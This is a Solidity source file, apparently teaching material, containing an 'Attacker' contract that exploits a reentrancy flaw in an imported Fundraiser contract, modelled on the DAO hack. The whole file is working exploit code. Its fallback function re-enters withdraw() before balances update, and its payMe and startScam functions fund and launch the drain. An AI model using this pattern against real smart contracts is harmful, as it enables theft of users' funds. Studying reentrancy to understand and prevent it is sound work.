// This contract shows how the attacker exploited the vulneribility in the Fundraiser contract.
    
    
    pragma solidity ^0.4.8;

    import "./DAO_Hack_Vulnerability_Fundraiser_EX.sol";

    contract Attacker{
    
            // Address of fundraiser to be attacked.
        address public fundraiserAddress;
            
            // How many times attack has been carried out. 
            //Have to keep gas limit in mind. Could use up gas allocation quickly.
        uint public drainTimes = 0;
    
            // Constructor that sets victim address from fundraiser contract when this contract is being launched
        function Attacker(address victimAddress){
            fundraiserAddress = victimAddress;
        }
 
            // Repeatatly calling the withdrawl function the amount of times stated in drainTimes.
            // This is carried out before the fundraiser contract is able to update their balance
            // which allows multiple withdrawls of the same balance.
            // Need to keep drainTimes less than 3 to keep from using up all of the gas allocation 
            // and canceling the transaction.
        function() payable{
            if(drainTimes<3){
                drainTimes++;
                Fundraiser(fundraiserAddress).withdraw();
            }
        }
    
            // How much money have we gathered into this smart contract
        function getFunds() returns (uint){
            return address(this).balance;
        }
    
            // Adding funds to this smart contract then instantly deposits all funds into fundraiser contract 
            // to use in exploting the vulnerability
        function payMe() payable{
            Fundraiser(fundraiserAddress).contribute.value(msg.value)();
        }
    
            // Calls withdraw function from fundraiser contract which exploits the vulnerability
        function startScam(){
            Fundraiser(fundraiserAddress).withdraw();
        }
    }
